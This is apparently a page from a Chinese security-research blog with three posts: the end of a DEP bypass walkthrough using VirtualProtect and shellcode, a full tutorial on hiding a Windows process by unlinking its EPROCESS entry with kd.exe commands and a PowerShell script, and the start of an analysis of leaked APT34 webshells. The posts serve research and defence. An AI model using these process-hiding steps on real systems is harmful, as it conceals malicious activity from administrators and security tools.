<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/2-9.png" alt="Alt text"></p>

<p>按F8单步执行，查看结果</p>

<p>如图，产生同样错误：ERRPR_INVALID_ADDRESS（000001E7）</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/3-1.png" alt="Alt text"></p>

<p>猜测，shellcode传入的起始地址有问题</p>

<p>继续我们的测试</p>

<h3 id="测试8">测试8</h3>

<p>接着测试5，单步跟踪到CALL KERNELBA.VirtualProtectEX，尝试修改堆栈中的数据</p>

<p>将内存地址0x0012FF2c修改为当前内存页的起始地址，即0x0012F000</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/3-2.png" alt="Alt text"></p>

<p>按F8单步执行，查看结果</p>

<p>如下图，寄存器EAX的值为1，即返回值为1，成功修改内存属性</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/3-3.png" alt="Alt text"></p>

<p>接着向下执行，在CALL ESP的位置按下F7，单步步入</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-10/3-4.png" alt="Alt text"></p>

<p>如上图，发现PUSH 1;POP ECX成功执行，测试成功，成功通过VirtualProtect绕过DEP，执行数据段的shellcode</p>

<p><strong>注：</strong></p>

<p>这种情况下，VirtualProtectEX一次最大只能修改4096长度的内存(即一个内存页的长度)，且不能跨页修改，如果越界，返回值为0，修改失败</p>

<p>通过C调用函数VirtualProtect不存在上述问题，可跨页，长度大于4096</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>为了在Win7下搭建测试环境，对VS2012的编译配置需要特别注意，多重保护在提高程序安全性的同时也给环境搭建带来了麻烦</p>

<p>不同系统下可供使用的替代指令往往不同，需要不断变换思路，构造合适的ROP链</p>

<p>另外，Immunity Debugger的mona插件可为ROP链的编写提供便利，但要注意存在bug的情况，需要更多的测试和优化</p>

<p>如果shellcode长度大于4096，使用VirtualProtect关闭DEP会失败，需要选择其他方法</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March 10, 2017
  </div>

  
</article><article class="post">
  <h1>Powershell tricks::Hide Process by kd.exe</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p><code class="language-plaintext highlighter-rouge">Pierre-Alexandre Braeken</code>在SecTor2016上做了一个很棒的演讲——HACK MICROSOFT BY USING MICROSOFT SIGNED BINARIES</p>

<p>他对自己开源的工具<code class="language-plaintext highlighter-rouge">PowerMemory</code>做了介绍，将powershell同使用微软签名的程序相结合，可以绕过Device Guard和杀毒软件的拦截</p>

<p><strong>演讲视频地址：</strong></p>

<p>https://sector.ca/sessions/hack-microsoft-by-using-microsoft-signed-binaries/</p>

<p><strong>PowerMemory项目地址：</strong></p>

<p>https://github.com/giMini/PowerMemory/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>PowerMemory内包含的脚本很多，其中一个比较有趣的脚本是<code class="language-plaintext highlighter-rouge">Hide-Me.ps1</code>，通过借助<code class="language-plaintext highlighter-rouge">kb.exe</code>来实现对进程的隐藏</p>

<p>本文将对该脚本进行测试，介绍进程隐藏的原理，修改原脚本，分析利用和防御方法。</p>

<h2 id="0x02-相关概念">0x02 相关概念</h2>
<hr>

<p><strong>PCB(process control block)：</strong></p>

<p>进程控制块，是系统为了管理进程专门设置的一个数据结构</p>

<p>PCB的组织方式：</p>

<ul>
  <li>线性表方式：不论进程的状态如何，将所有的PCB连续地存放在内存的系统区。这种方式适用于系统中进程数目不多的情况</li>
  <li>索引表方式：该方式是线性表方式的改进，系统按照进程的状态分别建立就绪索引表、阻塞索引表等</li>
  <li>链接表方式：系统按照进程的状态将进程的PCB组成队列，从而形成就绪队列、阻塞队列、运行队列等</li>
</ul>

<p>不同操作系统的PCB结构不同</p>

<p>Windows下的PCB是EPROCESS结构</p>

<p>进程链表是一个双向环链表</p>

<p><strong>EPROCESS结构：</strong></p>

<p>每个进程都有一个EPROCESS结构，里面保存着进程的各种信息和相关结构的指针</p>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows各版本的EPROCESS结构存在差异
</code></pre></div></div>

<p>EPROCESS结构位于系统地址空间，所以访问这个结构需要有ring0的权限</p>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows开启Local kernel debugging模式后，可进入ring0，使用内核态调试器
</code></pre></div></div>

<p>基本的内核态调试器有以下两种：</p>

<ul>
  <li>
    <p>kd.exe（KD）</p>

    <p>命令行模式</p>

    <p>常用于调试内核态的应用程序和驱动程序，调试用户态的应用程序，或者监视操作系统自身的行为等</p>
  </li>
  <li>
    <p>windbg.exe（WinDbg）</p>

    <p>界面模式</p>

    <p>可以为Windows内核、内核态驱动程序以及用户态应用程序提供完整的源代码级调试</p>
  </li>
</ul>

<p>通过kd.exe可以查看EPROCESS结构，命令行参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "dt nt!_eprocess"
</code></pre></div></div>

<p>回显如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lkd&gt; kd: Reading initial command 'dt nt!_eprocess;Q'
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 RundownProtect   : _EX_RUNDOWN_REF
   +0x2e8 UniqueProcessId  : Ptr64 Void
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
   +0x300 Flags2           : Uint4B
   +0x300 JobNotReallyActive : Pos 0, 1 Bit
   +0x300 AccountingFolded : Pos 1, 1 Bit
   +0x300 NewProcessReported : Pos 2, 1 Bit
   +0x300 ExitProcessReported : Pos 3, 1 Bit
   +0x300 ReportCommitChanges : Pos 4, 1 Bit
   +0x300 LastReportMemory : Pos 5, 1 Bit
   +0x300 ForceWakeCharge  : Pos 6, 1 Bit
   +0x300 CrossSessionCreate : Pos 7, 1 Bit
   +0x300 NeedsHandleRundown : Pos 8, 1 Bit
   +0x300 RefTraceEnabled  : Pos 9, 1 Bit
   +0x300 DisableDynamicCode : Pos 10, 1 Bit
   +0x300 EmptyJobEvaluated : Pos 11, 1 Bit
   +0x300 DefaultPagePriority : Pos 12, 3 Bits
   +0x300 PrimaryTokenFrozen : Pos 15, 1 Bit
   +0x300 ProcessVerifierTarget : Pos 16, 1 Bit
   +0x300 StackRandomizationDisabled : Pos 17, 1 Bit
   +0x300 AffinityPermanent : Pos 18, 1 Bit
   +0x300 AffinityUpdateEnable : Pos 19, 1 Bit
   +0x300 PropagateNode    : Pos 20, 1 Bit
   +0x300 ExplicitAffinity : Pos 21, 1 Bit
   +0x300 ProcessExecutionState : Pos 22, 2 Bits
   +0x300 DisallowStrippedImages : Pos 24, 1 Bit
   +0x300 HighEntropyASLREnabled : Pos 25, 1 Bit
   +0x300 ExtensionPointDisable : Pos 26, 1 Bit
   +0x300 ForceRelocateImages : Pos 27, 1 Bit
   +0x300 ProcessStateChangeRequest : Pos 28, 2 Bits
   +0x300 ProcessStateChangeInProgress : Pos 30, 1 Bit
   +0x300 DisallowWin32kSystemCalls : Pos 31, 1 Bit
   +0x304 Flags            : Uint4B
   +0x304 CreateReported   : Pos 0, 1 Bit
   +0x304 NoDebugInherit   : Pos 1, 1 Bit
   +0x304 ProcessExiting   : Pos 2, 1 Bit
   +0x304 ProcessDelete    : Pos 3, 1 Bit
   +0x304 ControlFlowGuardEnabled : Pos 4, 1 Bit
   +0x304 VmDeleted        : Pos 5, 1 Bit
   +0x304 OutswapEnabled   : Pos 6, 1 Bit
   +0x304 Outswapped       : Pos 7, 1 Bit
   +0x304 FailFastOnCommitFail : Pos 8, 1 Bit
   +0x304 Wow64VaSpace4Gb  : Pos 9, 1 Bit
   +0x304 AddressSpaceInitialized : Pos 10, 2 Bits
   +0x304 SetTimerResolution : Pos 12, 1 Bit
   +0x304 BreakOnTermination : Pos 13, 1 Bit
   +0x304 DeprioritizeViews : Pos 14, 1 Bit
   +0x304 WriteWatch       : Pos 15, 1 Bit
   +0x304 ProcessInSession : Pos 16, 1 Bit
   +0x304 OverrideAddressSpace : Pos 17, 1 Bit
   +0x304 HasAddressSpace  : Pos 18, 1 Bit
   +0x304 LaunchPrefetched : Pos 19, 1 Bit
   +0x304 Background       : Pos 20, 1 Bit
   +0x304 VmTopDown        : Pos 21, 1 Bit
   +0x304 ImageNotifyDone  : Pos 22, 1 Bit
   +0x304 PdeUpdateNeeded  : Pos 23, 1 Bit
   +0x304 VdmAllowed       : Pos 24, 1 Bit
   +0x304 ProcessRundown   : Pos 25, 1 Bit
   +0x304 ProcessInserted  : Pos 26, 1 Bit
   +0x304 DefaultIoPriority : Pos 27, 3 Bits
   +0x304 ProcessSelfDelete : Pos 30, 1 Bit
   +0x304 SetTimerResolutionLink : Pos 31, 1 Bit
   +0x308 CreateTime       : _LARGE_INTEGER
   +0x310 ProcessQuotaUsage : [2] Uint8B
   +0x320 ProcessQuotaPeak : [2] Uint8B
   +0x330 PeakVirtualSize  : Uint8B
   +0x338 VirtualSize      : Uint8B
   +0x340 SessionProcessLinks : _LIST_ENTRY
   +0x350 ExceptionPortData : Ptr64 Void
   +0x350 ExceptionPortValue : Uint8B
   +0x350 ExceptionPortState : Pos 0, 3 Bits
   +0x358 Token            : _EX_FAST_REF
   +0x360 WorkingSetPage   : Uint8B
   +0x368 AddressCreationLock : _EX_PUSH_LOCK
   +0x370 PageTableCommitmentLock : _EX_PUSH_LOCK
   +0x378 RotateInProgress : Ptr64 _ETHREAD
   +0x380 ForkInProgress   : Ptr64 _ETHREAD
   +0x388 CommitChargeJob  : Ptr64 _EJOB
   +0x390 CloneRoot        : _RTL_AVL_TREE
   +0x398 NumberOfPrivatePages : Uint8B
   +0x3a0 NumberOfLockedPages : Uint8B
   +0x3a8 Win32Process     : Ptr64 Void
   +0x3b0 Job              : Ptr64 _EJOB
   +0x3b8 SectionObject    : Ptr64 Void
   +0x3c0 SectionBaseAddress : Ptr64 Void
   +0x3c8 Cookie           : Uint4B
   +0x3d0 WorkingSetWatch  : Ptr64 _PAGEFAULT_HISTORY
   +0x3d8 Win32WindowStation : Ptr64 Void
   +0x3e0 InheritedFromUniqueProcessId : Ptr64 Void
   +0x3e8 LdtInformation   : Ptr64 Void
   +0x3f0 OwnerProcessId   : Uint8B
   +0x3f8 Peb              : Ptr64 _PEB
   +0x400 Session          : Ptr64 Void
   +0x408 AweInfo          : Ptr64 Void
   +0x410 QuotaBlock       : Ptr64 _EPROCESS_QUOTA_BLOCK
   +0x418 ObjectTable      : Ptr64 _HANDLE_TABLE
   +0x420 DebugPort        : Ptr64 Void
   +0x428 WoW64Process     : Ptr64 _EWOW64PROCESS
   +0x430 DeviceMap        : Ptr64 Void
   +0x438 EtwDataSource    : Ptr64 Void
   +0x440 PageDirectoryPte : Uint8B
   +0x448 ImageFilePointer : Ptr64 _FILE_OBJECT
   +0x450 ImageFileName    : [15] UChar
   +0x45f PriorityClass    : UChar
   +0x460 SecurityPort     : Ptr64 Void
   +0x468 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO
   +0x470 JobLinks         : _LIST_ENTRY
   +0x480 HighestUserAddress : Ptr64 Void
   +0x488 ThreadListHead   : _LIST_ENTRY
   +0x498 ActiveThreads    : Uint4B
   +0x49c ImagePathHash    : Uint4B
   +0x4a0 DefaultHardErrorProcessing : Uint4B
   +0x4a4 LastThreadExitStatus : Int4B
   +0x4a8 PrefetchTrace    : _EX_FAST_REF
   +0x4b0 LockedPagesList  : Ptr64 Void
   +0x4b8 ReadOperationCount : _LARGE_INTEGER
   +0x4c0 WriteOperationCount : _LARGE_INTEGER
   +0x4c8 OtherOperationCount : _LARGE_INTEGER
   +0x4d0 ReadTransferCount : _LARGE_INTEGER
   +0x4d8 WriteTransferCount : _LARGE_INTEGER
   +0x4e0 OtherTransferCount : _LARGE_INTEGER
   +0x4e8 CommitChargeLimit : Uint8B
   +0x4f0 CommitCharge     : Uint8B
   +0x4f8 CommitChargePeak : Uint8B
   +0x500 Vm               : _MMSUPPORT
   +0x5f8 MmProcessLinks   : _LIST_ENTRY
   +0x608 ModifiedPageCount : Uint4B
   +0x60c ExitStatus       : Int4B
   +0x610 VadRoot          : _RTL_AVL_TREE
   +0x618 VadHint          : Ptr64 Void
   +0x620 VadCount         : Uint8B
   +0x628 VadPhysicalPages : Uint8B
   +0x630 VadPhysicalPagesLimit : Uint8B
   +0x638 AlpcContext      : _ALPC_PROCESS_CONTEXT
   +0x658 TimerResolutionLink : _LIST_ENTRY
   +0x668 TimerResolutionStackRecord : Ptr64 _PO_DIAG_STACK_RECORD
   +0x670 RequestedTimerResolution : Uint4B
   +0x674 SmallestTimerResolution : Uint4B
   +0x678 ExitTime         : _LARGE_INTEGER
   +0x680 InvertedFunctionTable : Ptr64 _INVERTED_FUNCTION_TABLE
   +0x688 InvertedFunctionTableLock : _EX_PUSH_LOCK
   +0x690 ActiveThreadsHighWatermark : Uint4B
   +0x694 LargePrivateVadCount : Uint4B
   +0x698 ThreadListLock   : _EX_PUSH_LOCK
   +0x6a0 WnfContext       : Ptr64 Void
   +0x6a8 Spare0           : Uint8B
   +0x6b0 SignatureLevel   : UChar
   +0x6b1 SectionSignatureLevel : UChar
   +0x6b2 Protection       : _PS_PROTECTION
   +0x6b3 HangCount        : UChar
   +0x6b4 Flags3           : Uint4B
   +0x6b4 Minimal          : Pos 0, 1 Bit
   +0x6b4 ReplacingPageRoot : Pos 1, 1 Bit
   +0x6b4 DisableNonSystemFonts : Pos 2, 1 Bit
   +0x6b4 AuditNonSystemFontLoading : Pos 3, 1 Bit
   +0x6b4 Crashed          : Pos 4, 1 Bit
   +0x6b4 JobVadsAreTracked : Pos 5, 1 Bit
   +0x6b4 VadTrackingDisabled : Pos 6, 1 Bit
   +0x6b4 AuxiliaryProcess : Pos 7, 1 Bit
   +0x6b4 SubsystemProcess : Pos 8, 1 Bit
   +0x6b4 IndirectCpuSets  : Pos 9, 1 Bit
   +0x6b4 InPrivate        : Pos 10, 1 Bit
   +0x6b4 ProhibitRemoteImageMap : Pos 11, 1 Bit
   +0x6b4 ProhibitLowILImageMap : Pos 12, 1 Bit
   +0x6b4 SignatureMitigationOptIn : Pos 13, 1 Bit
   +0x6b8 DeviceAsid       : Int4B
   +0x6c0 SvmData          : Ptr64 Void
   +0x6c8 SvmProcessLock   : _EX_PUSH_LOCK
   +0x6d0 SvmLock          : Uint8B
   +0x6d8 SvmProcessDeviceListHead : _LIST_ENTRY
   +0x6e8 LastFreezeInterruptTime : Uint8B
   +0x6f0 DiskCounters     : Ptr64 _PROCESS_DISK_COUNTERS
   +0x6f8 PicoContext      : Ptr64 Void
   +0x700 TrustletIdentity : Uint8B
   +0x708 KeepAliveCounter : Uint4B
   +0x70c NoWakeKeepAliveCounter : Uint4B
   +0x710 HighPriorityFaultsAllowed : Uint4B
   +0x718 EnergyValues     : Ptr64 _PROCESS_ENERGY_VALUES
   +0x720 VmContext        : Ptr64 Void
   +0x728 SequenceNumber   : Uint8B
   +0x730 CreateInterruptTime : Uint8B
   +0x738 CreateUnbiasedInterruptTime : Uint8B
   +0x740 TotalUnbiasedFrozenTime : Uint8B
   +0x748 LastAppStateUpdateTime : Uint8B
   +0x750 LastAppStateUptime : Pos 0, 61 Bits
   +0x750 LastAppState     : Pos 61, 3 Bits
   +0x758 SharedCommitCharge : Uint8B
   +0x760 SharedCommitLock : _EX_PUSH_LOCK
   +0x768 SharedCommitLinks : _LIST_ENTRY
   +0x778 AllowedCpuSets   : Uint8B
   +0x780 DefaultCpuSets   : Uint8B
   +0x778 AllowedCpuSetsIndirect : Ptr64 Uint8B
   +0x780 DefaultCpuSetsIndirect : Ptr64 Uint8B
</code></pre></div></div>

<p>其中,<code class="language-plaintext highlighter-rouge">+0x2f0 ActiveProcessLinks : _LIST_ENTRY</code>表示进程活动链表</p>

<p><strong>进程活动链表：</strong></p>

<p>是一个PLIST_ENTRY结构的双向链表，把每个EPROCESS链接起来</p>

<p>当一个新进程建立的时候，父进程负责完成EPROCESS块，然后把ActiveProcessLinks链接到一个全局内核变量PsActiveProcessHead链表中</p>

<p>当进程结束的时候，该进程的EPROCESS结构从活动进程链上摘除</p>

<p>遍历整个链表，就能实现对进程的枚举</p>

<p><strong>双链表的删除操作：</strong></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-1.png" alt="Alt text"></p>

<blockquote>
  <p>void DDeleteNode(DListNode <em>p)
      {//在带头结点的双链表中，删除结点</em>p，设*p为非终端结点
          p-&gt;prior-&gt;next=p-&gt;next;//① （使p的前一个结点的后驱直接指向 原来的p的后驱）
          p-&gt;next-&gt;prior=p-&gt;prior;//② （使p的后一个结点的前驱 直接为原来p的前一个结点）
          free(p);//③ （释放p的内存）
      }</p>
</blockquote>

<p>图和说明引用自http://blog.163.com/haibianfeng_yr/blog/static/34572620201453061036702/</p>

<p><strong>隐藏进程：</strong></p>

<p>相当于对双向链表ActiveProcessLinks断链</p>

<p>对应双链表的删除需要做如下操作：</p>

<ol>
  <li>p-&gt;prior-&gt;next=p-&gt;next
Flink-&gt;Blink=Blink</li>
  <li>p-&gt;next-&gt;prior=p-&gt;prior
Blink-&gt;Flink = Flink</li>
  <li>free(p)
Blink =dwSelfEPROCESS
Flink = dwSelfEPROCESS</li>
</ol>

<p>接下来实例介绍如何通过kd.exe隐藏进程，也就是双链表的断链</p>

<h2 id="0x03-通过kdexe隐藏进程">0x03 通过kd.exe隐藏进程</h2>
<hr>

<p><strong>环境搭建：</strong></p>

<ul>
  <li>开启Local kernel debugging模式</li>
</ul>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>自从Windows Vista开始，Local kernel debugging默认被禁用
</code></pre></div></div>

<p>开启方法：</p>

<p>管理员权限执行：<code class="language-plaintext highlighter-rouge">bcdedit -debug on</code>,重启</p>

<p>下载安装Debugging Tools for Windows,找到kd.exe</p>

<p>测试进程：<code class="language-plaintext highlighter-rouge">notepad.exe</code>
测试系统： <code class="language-plaintext highlighter-rouge">Win10 x64</code></p>

<h3 id="1获取notepadexe的内存起始地址">1、获取notepad.exe的内存起始地址</h3>

<p>kd命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process 0 0 $processName
</code></pre></div></div>

<p>完整命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "!process 0 0 notepad.exe;Q" 
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-2.png" alt="Alt text"></p>

<p>notepad.exe的内存起始地址$processAddress为ffffe00195236080</p>

<h3 id="2获取进程notepadexe的flink和blink">2、获取进程notepad.exe的Flink和Blink</h3>

<p>kd命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dt nt!_eprocess ActiveProcessLinks ImageFileName $processAddress
</code></pre></div></div>

<p>完整命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "dt nt!_eprocess ActiveProcessLinks ImageFileName ffffe00195236080;Q" 
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FLINK指针指向下一个元素，相当于双链表中的p-&gt;next
BLINK指针指向前一个元素，相当于双链表中的p-&gt;prior
_LIST_ENTRY结构如下：
_LIST_ENTRY[Flink-Blink]
前一参数代表Flink，后一参数代表Blink
</code></pre></div></div>

<p>由上图可知：</p>

<ul>
  <li>
    <p>$Flink：0xffffe001`93e1a370</p>
  </li>
  <li>
    <p>$Blink：0xffffe001`9604f6f0</p>
  </li>
</ul>

<h3 id="3获取进程notepadexe在双链表的地址thisprocesslinks">3、获取进程notepad.exe在双链表的地址$thisProcessLinks</h3>

<p>kd命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dt nt!_eprocess ActiveProcessLinks.Blink ImageFileName $processAddress
</code></pre></div></div>

<p>完整命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "dt nt!_eprocess ActiveProcessLinks.Blink ImageFileName ffffe00195236080;Q" 
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-4.png" alt="Alt text"></p>

<p>可知：</p>

<ul>
  <li>$thisProcessLinks：0xffffe001`95236370</li>
</ul>

<p><strong>注:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dt nt!_eprocess ActiveProcessLinks.Blink ImageFileName相当于进程notepad.exe的前一个进程
</code></pre></div></div>

<p>故</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+0x008 Blink ： 0xffffe001`9604f6f0 _LIST_ENTRY [0xffffe001`95236370-Blink]
</code></pre></div></div>

<p>中的0xffffe001`95236370相当于进程notepad.exe在双链表的地址$thisProcessLinks</p>

<p><strong>补充：</strong></p>

<p>+0x000 Flink: 0xffffe001`93e1a370 _LIST_ENTRY[Flink-Blink]中的Blink也能代表双链表的地址$thisProcessLinks</p>

<p><strong>简单的理解：</strong></p>

<p>当前进程的Blink的Flink等价于当前进程的Flink的Blink，也就是当前进程的地址$thisProcessLinks</p>

<h3 id="4将前一进程指向下一个元素的指针flink替换为当前进程的flink指针flink-blinkblink">4、将前一进程指向下一个元素的指针FLINK替换为当前进程的FLINK指针(Flink-&gt;Blink=Blink)</h3>

<p>即双链表删除操作的第1步：</p>

<p><code class="language-plaintext highlighter-rouge">p-&gt;prior-&gt;next=p-&gt;next</code></p>

<p>kd命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f $Blink+0x000 L4 ($Flink的第0字节) ($Flink的第1字节) ($Flink的第2字节) ($Flink的第3字节)
</code></pre></div></div>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+0x000代表Flink
+0x008代表Blink
$Blink+0x000代表p-&gt;prior-&gt;next(0x000为0，可省略)
L4参数指定内存区间的长度为4个DWORD
</code></pre></div></div>

<p>完整命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "f 0xffffe001`9604f6f0 L4 0x70 0xa3 0xe1 0x93;Q"
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-5.png" alt="Alt text"></p>

<p>操作成功，实现双链表删除中的p-&gt;prior-&gt;next=p-&gt;next</p>

<h3 id="5将下一进程指向前一个元素的指针blink替换为当前进程的blink指针">5、将下一进程指向前一个元素的指针Blink替换为当前进程的BLINK指针</h3>

<p>即双链表删除操作的第2步：</p>

<p><code class="language-plaintext highlighter-rouge">p-&gt;next-&gt;prior=p-&gt;prior</code></p>

<p>kd命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f $Flink+0x008 L4 ($Blink的第0字节) ($Blink的第1字节) ($Blink的第2字节) ($Blink的第3字节)
</code></pre></div></div>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+0x008代表Blink
$Flink++0x008代表p-&gt;next-&gt;prior
</code></pre></div></div>

<p>完整命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "f 0xffffe001`93e1a370 L4 0xf0 0xf6 0x04 0x96;Q"
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-6.png" alt="Alt text"></p>

<p>操作成功，实现双链表删除中的p-&gt;next-&gt;prior=p-&gt;prior</p>

<h3 id="6进程自身的新flink指向进程自身的双链表地址thisprocesslinks">6、进程自身的新Flink指向进程自身的双链表地址$thisProcessLinks</h3>

<p>kd命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f $thisProcessLinks+0x000 L4 ($thisProcessLinks的第0字节) ($thisProcessLinks的第1字节) ($thisProcessLinks的第2字节) (thisProcessLinks的第3字节)
</code></pre></div></div>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+0x000代表Flink
</code></pre></div></div>

<p>完整命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "0xffffe001`95236370 L4 0x70 0x63 0x23 0x95;Q"
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-7.png" alt="Alt text"></p>

<h3 id="7进程自身的新blink指向进程自身的双链表地址thisprocesslinks">7、进程自身的新Blink指向进程自身的双链表地址$thisProcessLinks</h3>

<p>kd命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f $thisProcessLinks+0x008 L4 ($thisProcessLinks的第0字节) ($thisProcessLinks的第1字节) ($thisProcessLinks的第2字节) (thisProcessLinks的第3字节)
</code></pre></div></div>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+0x008代表Blink
</code></pre></div></div>

<p>完整命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "0xffffe001`95236370+0x008 L4 0x70 0x63 0x23 0x95;Q"
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-8.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7、8操作必须，对应双链表删除操作中的free(p),否则会蓝屏
</code></pre></div></div>

<h3 id="8测试">8、测试</h3>

<p>在tasklist和Process Explorer中，notepad.exe进程均被隐藏</p>

<h2 id="0x04-powershell自动实现">0x04 powershell自动实现</h2>
<hr>

<p>以上操作可通过powershell脚本自动实现，这就是Hide-Me.ps1实现的功能</p>

<p>Hide-Me.ps1有一处需要注意的地方:
https://github.com/giMini/PowerMemory/blob/master/PowerProcess/Hide-Me.ps1#L128</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f $BLINK L4 0x$($FLINK.Substring(17,2)) 0x$($FLINK.Substring(15,2)) 0x$($FLINK.Substring(13,2)) 0x$($FLINK.Substring(11,2))"
</code></pre></div></div>
<p>此处<code class="language-plaintext highlighter-rouge">$BLINK</code>实际为<code class="language-plaintext highlighter-rouge">$BLINK+0x000</code>,表示<code class="language-plaintext highlighter-rouge">p-&gt;prior-&gt;next</code>(0x000为0，已省略)</p>

<p>适用环境：</p>

<ul>
  <li>Win7、8、10 64位操作系统</li>
</ul>

<p>利用前提：</p>

<ul>
  <li>开启Local kernel debugging模式</li>
  <li>管理员权限执行：bcdedit -debug on</li>
  <li>重启后测试</li>
</ul>

<p>由于PowerMemory做了脚本整合，所以Hide-Me.ps1还需要其他支持文件</p>

<p>我对其进行了少量修改，只提取隐藏进程的关键代码，最终整合到一个ps脚本中，地址如下：</p>

<p>https://github.com/3gstudent/Hide-Process-by-kd.exe</p>

<h2 id="0x05-防御思路">0x05 防御思路</h2>
<hr>

<p>该方法利用前提：</p>

<p>已获得系统管理员权限并开启Local kernel debugging模式，系统重启</p>

<p>也就是说攻击者已进入ring 0层才能利用这个方法</p>

<p>对于普通用户，可以永久关闭Local kernel debugging模式：</p>

<ul>
  <li>bcdedit -debug off</li>
</ul>

<h2 id="0x06-补充">0x06 补充</h2>
<hr>

<ul>
  <li>该脚本尚不支持32位系统</li>
  <li>Windbg也能实现相同操作</li>
</ul>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 15, 2016
  </div>

  
</article><article class="post">
  <h1>对APT34泄露工具的分析——HighShell和HyperShell</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近APT34的6款工具被泄露，本文作为分析文章的第二篇，仅在技术角度对其中的HighShell和HyperShell进行分析</p>

<p>参考资料：</p>

<p>https://malware-research.org/apt34-hacking-tools-leak/amp/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>对HighShell的分析</li>
  <li>对HyperShell的分析</li>
  <li>小结</li>
</ul>

<h2 id="0x02-对highshell的分析">0x02 对HighShell的分析</h2>
<hr>

<p>对应泄露文件的名称为Webshells_and_Panel中的HighShell</p>

<p>其中的文件为HighShell.aspx，是针对Windows服务器的webshell</p>

